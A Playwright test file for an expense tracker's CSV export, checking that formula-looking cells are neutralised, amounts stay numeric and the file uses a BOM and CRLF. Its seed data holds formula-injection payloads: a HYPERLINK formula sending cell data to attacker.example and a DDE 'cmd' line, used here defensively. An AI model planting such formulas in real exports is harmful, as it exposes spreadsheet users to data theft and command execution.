import { readFile } from 'node:fs/promises'
import { test, expect, type Download, type Page } from '@playwright/test'

// CSV exports must open as plain data in a spreadsheet: formula-looking text is
// neutralised with a leading apostrophe, amounts stay numbers, and the file is
// UTF-8 with a BOM. Every expense below is invented test data.

// Honolulu (UTC-10): a date-only string parsed as UTC would slip back a day here.
test.use({ timezoneId: 'Pacific/Honolulu' })

const HYPERLINK = '=HYPERLINK("http://attacker.example/?d="&A1,"Refund")'
const CMD = "+cmd|' /C calc'!A0"

const SEED = [
  {
    id: 'csv-1',
    itemName: 'Kopi O',
    amount: 1.8,
    category: 'Food',
    date: '2026-03-14T12:00:00',
    notes: 'less sugar, more ice',
  },
  {
    id: 'csv-2',
    itemName: HYPERLINK,
    amount: 25,
    category: 'Shopping',
    date: '2026-03-13T12:00:00',
  },
  { id: 'csv-3', itemName: CMD, amount: 14.2, category: 'Transport', date: '2026-03-12T12:00:00' },
  {
    id: 'csv-4',
    itemName: 'Gift card',
    amount: 50,
    category: '@SUM(1+1)',
    date: '2026-03-11T12:00:00',
  },
  {
    id: 'csv-5',
    itemName: 'Shoe refund',
    amount: -12.5,
    category: 'Shopping',
    date: '2026-03-15',
    notes: '-2+3',
  },
  {
    id: 'csv-6',
    itemName: '鸡饭',
    amount: 4.5,
    category: 'Food',
    date: '2026-03-10T12:00:00',
    notes: 'line one\n"quoted" line two',
  },
].map((e) => ({ ...e, createdAt: '2026-03-10T12:00:00' }))

const HEADER = ['Date', 'Item', 'Category', 'Amount', 'Notes']

// The Ledger screen and the toast host are lazy chunks; cold, under a parallel run, they
// can take longer than the default 5 s to arrive. Wait for them, never for a fixed time.
const LAZY_CHUNK = { timeout: 15_000 }

// Keyed by the exported Item cell, since the two exporters order rows differently.
const EXPECTED: Record<string, string[]> = {
  'Kopi O': ['2026-03-14', 'Kopi O', 'Food', '1.8', 'less sugar, more ice'],
  [`'${HYPERLINK}`]: ['2026-03-13', `'${HYPERLINK}`, 'Shopping', '25', ''],
  [`'${CMD}`]: ['2026-03-12', `'${CMD}`, 'Transport', '14.2', ''],
  'Gift card': ['2026-03-11', 'Gift card', "'@SUM(1+1)", '50', ''],
  'Shoe refund': ['2026-03-15', 'Shoe refund', 'Shopping', '-12.5', "'-2+3"],
  鸡饭: ['2026-03-10', '鸡饭', 'Food', '4.5', 'line one\n"quoted" line two'],
}

/** Minimal RFC 4180 reader: quoted cells, doubled quotes, CRLF records. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = []
  let row: string[] = []
  let cell = ''
  let quoted = false
  for (let i = 0; i < text.length; i++) {
    const ch = text[i]
    if (quoted) {
      if (ch === '"' && text[i + 1] === '"') {
        cell += '"'
        i++
      } else if (ch === '"') {
        quoted = false
      } else {
        cell += ch
      }
    } else if (ch === '"') {
      quoted = true
    } else if (ch === ',') {
      row.push(cell)
      cell = ''
    } else if (ch === '\r' && text[i + 1] === '\n') {
      row.push(cell)
      rows.push(row)
      row = []
      cell = ''
      i++
    } else {
      cell += ch
    }
  }
  return rows
}

async function readDownload(download: Download) {
  const path = await download.path()
  return readFile(path)
}

function expectSafeCsv(bytes: Buffer) {
  // UTF-8 byte order mark, so Excel reads 鸡饭 correctly.
  expect([...bytes.subarray(0, 3)]).toEqual([0xef, 0xbb, 0xbf])
  const text = bytes.subarray(3).toString('utf8')
  expect(text.endsWith('\r\n')).toBe(true)
  // Every record ends in CRLF; the only bare LF is the one inside the quoted note.
  expect(text.replace(/\r\n/g, '').split('\n')).toHaveLength(2)

  const [header, ...rows] = parseCsv(text)
  expect(header).toEqual(HEADER)
  expect(rows).toHaveLength(SEED.length)
  for (const row of rows) {
    const item = row[1] ?? ''
    expect(row, `row for ${item}`).toEqual(EXPECTED[item])
  }
  // No data cell can start a formula.
  for (const cell of rows.flat()) {
    if (cell === '' || /^-?\d+(\.\d+)?$/.test(cell)) continue
    expect(cell, cell).not.toMatch(/^[=+\-@\t\r]/)
  }
}

async function seedExpenses(page: Page, seed: readonly object[]) {
  await page.addInitScript((expenses) => {
    localStorage.setItem('expenses', JSON.stringify(expenses))
  }, seed)
}

async function openBackupPanel(page: Page) {
  await page.getByRole('button', { name: 'Settings', exact: true }).click()
  await page.getByRole('tab', { name: 'Backup', exact: true }).click()
}

/** A toast on screen (screen readers hear it from a live region of their own). */
const toastText = (page: Page, text: string) =>
  page.getByRole('region', { name: 'Notifications' }).getByText(text)

test.describe('CSV export', () => {
  test.beforeEach(async ({ page }) => {
    await seedExpenses(page, SEED)
  })

  test('Ledger export is spreadsheet-safe', async ({ page }) => {
    await page.goto('/ledger?range=all')
    const exportButton = page.getByRole('button', { name: 'Export filtered entries to CSV' })
    await expect(exportButton).toBeVisible(LAZY_CHUNK)

    // The toast lasts 4 s, so watch for it alongside the click, not after the file is saved.
    const [download] = await Promise.all([
      page.waitForEvent('download'),
      expect(toastText(page, `Exported ${String(SEED.length)} entries`)).toBeVisible(LAZY_CHUNK),
      exportButton.click(),
    ])
    expect(download.suggestedFilename()).toMatch(/^spendtrack-\d{4}-\d{2}-\d{2}\.csv$/)
    expectSafeCsv(await readDownload(download))
  })

  test('Settings > Backup export is spreadsheet-safe', async ({ page }) => {
    await page.goto('/pulse')
    await openBackupPanel(page)
    const exportButton = page.getByRole('button', { name: 'Export to CSV' })
    await expect(exportButton).toBeVisible()

    const [download] = await Promise.all([
      page.waitForEvent('download'),
      expect(toastText(page, 'CSV exported')).toBeVisible(LAZY_CHUNK),
      exportButton.click(),
    ])
    expect(download.suggestedFilename()).toMatch(/^spendtrack-\d{4}-\d{2}-\d{2}\.csv$/)
    expectSafeCsv(await readDownload(download))
  })
})

test.describe('CSV export with no expenses', () => {
  test.beforeEach(async ({ page }) => {
    await seedExpenses(page, [])
  })

  test('Ledger offers no export; Settings exports the header only', async ({ page }) => {
    await page.goto('/ledger?range=all')
    await expect(page.getByText('0 entries', { exact: true })).toBeVisible(LAZY_CHUNK)
    await expect(page.getByRole('button', { name: 'Export filtered entries to CSV' })).toHaveCount(
      0,
    )

    await openBackupPanel(page)
    const exportButton = page.getByRole('button', { name: 'Export to CSV' })
    const [download] = await Promise.all([page.waitForEvent('download'), exportButton.click()])
    const bytes = await readDownload(download)
    expect(bytes.toString('utf8')).toBe('\uFEFFDate,Item,Category,Amount,Notes\r\n')
  })
})
